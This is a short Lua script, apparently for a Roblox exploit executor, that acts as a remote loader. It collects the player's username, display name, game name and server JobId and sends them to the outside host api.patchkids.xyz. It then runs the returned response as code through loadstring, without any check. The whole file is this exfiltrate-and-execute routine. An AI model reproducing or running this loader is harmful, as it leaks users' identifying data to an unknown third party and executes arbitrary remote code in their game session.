local loadstringFn = loadstring
local requestFn = request or http_request or (http and http.request) or (syn and syn.request)

local player = game:GetService("Players").LocalPlayer
local marketplace = game:GetService("MarketplaceService")

print("Passed check 1/5")

local gameName = "Unknown Game"
pcall(function()
    gameName = marketplace:GetProductInfo(game.PlaceId).gameName
    warn("Pcall result:", gameName)
end)

warn("Pcall passed")
print("Passed check 2/5")

local cleanDisplay = player.DisplayName

local targetUrl = "https://api.patchkids.xyz"
    .. "?user=" .. player.Name
    .. "&display=" .. cleanDisplay
    .. "&game=" .. gameName
    .. "&job=" .. game.JobId;

print("Passed check 3/5 (result:)", targetUrl)

local networkPayload = requestFn({
    Url = targetUrl,
    Headers = {["User-Agent"] = "PatchKids"}
})

print("Passed check 4/5 (result:)", networkPayload)

loadstringFn(networkPayload.Body)()
print("Passed check 5/5")
